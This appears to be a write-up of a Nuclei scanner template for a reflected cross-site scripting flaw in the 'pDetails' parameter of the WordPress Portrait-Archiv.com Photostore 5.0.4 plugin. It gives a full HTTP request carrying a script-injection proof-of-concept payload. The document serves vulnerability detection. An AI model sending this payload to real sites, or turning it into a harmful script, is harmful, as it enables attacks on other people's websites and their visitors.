# Nuclei Template: WordPress Portrait-Archiv.com Photostore 5.0.4 - Reflected Cross Site Scripting
**Template ID:** wp-portrait-archiv-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-portrait-archiv-xss.yaml`)

## Vulnerability Information & PoC

## Description
The 'pDetails' GET parameter from the js/imageDetails.php was vulnerable to an unauthenticated reflected XSS attack.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails=);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/c6a8757e-41ef-4c20-8c7d-97b57d56fe0e
- https://wordpress.org/plugins/portrait-archiv-shop/
- https://packetstormsecurity.com/files/154343/
